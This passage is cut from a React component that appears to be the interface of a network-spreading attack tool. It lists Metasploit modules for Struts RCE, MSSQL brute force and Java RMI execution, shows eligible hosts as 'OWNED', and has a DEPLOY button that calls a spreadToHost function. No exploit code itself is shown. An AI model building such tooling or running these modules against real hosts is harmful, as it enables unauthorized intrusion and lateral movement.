                  { vector: "HTTP Struts RCE", module: "exploit/multi/http/struts2_code_exec", port: 8080, os: "Java/Linux", color: "orange" },
                  { vector: "MSSQL SA Brute", module: "auxiliary/scanner/mssql/mssql_login", port: 1433, os: "Windows", color: "yellow" },
                  { vector: "Java RMI Exec", module: "exploit/multi/misc/java_rmi_server", port: 1099, os: "Java", color: "orange" },
                ].map(({ vector, module, port, os: osLabel, color }) => {
                  const eligible = hosts.filter((h) => h.status === "up" && h.openPorts?.includes(port));
                  return (
                    <div key={vector} className={`border border-${color}-900/20 rounded p-3`}>
                      <div className={`text-[9px] text-${color}-500 mb-1`}>{vector}</div>
                      <div className="text-[8px] text-green-900/50 mb-1 truncate">{module}</div>
                      <div className="flex items-center gap-2">
                        <span className={`text-[7px] border border-${color}-900/30 px-1 rounded text-${color}-800`}>:{port}</span>
                        <span className="text-[7px] text-green-900/40">{osLabel}</span>
                        {eligible.length > 0 && (
                          <span className={`ml-auto text-[7px] text-${color}-600`}>{eligible.length} target(s)</span>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Host targets */}
              {hosts.filter((h) => h.status === "up").length === 0 ? (
                <div className="text-center py-8 text-[9px] text-green-900/40">
                  Run LAN Discovery first to identify targets
                </div>
              ) : (
                <div className="space-y-1">
                  <div className="text-[9px] text-green-700 tracking-widest mb-2">ELIGIBLE TARGETS</div>
                  {hosts.filter((h) => h.status === "up").map((h) => (
                    <div key={h.ip} className={`flex items-center gap-3 border rounded px-3 py-2 text-[9px] ${
                      h.compromised ? "border-red-700/40 bg-red-950/10" : "border-green-900/20"
                    }`}>
                      <div className={`w-2 h-2 rounded-full ${h.compromised ? "bg-red-400 shadow-[0_0_6px_#ef4444]" : "bg-green-600"}`} />
                      <span className="text-green-300 w-24">{h.ip}</span>
                      <span className="text-green-800 flex-1">{h.os ?? "?"} · {h.openPorts?.join(", ") ?? "no ports"}</span>
                      <span className={`border px-1.5 py-0.5 rounded text-[8px] ${RISK_COLOR[h.risk]}`}>{h.risk.toUpperCase()}</span>
                      {h.compromised ? (
                        <span className="text-red-400 text-[9px]">OWNED ✓</span>
                      ) : (
                        <button onClick={() => spreadToHost(h)} disabled={!!loading}
                          className="px-3 py-1 text-[9px] border border-red-800/50 text-red-700 rounded hover:text-red-500 hover:border-red-600/60 transition-all disabled:opacity-40">
                          DEPLOY
                        </button>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
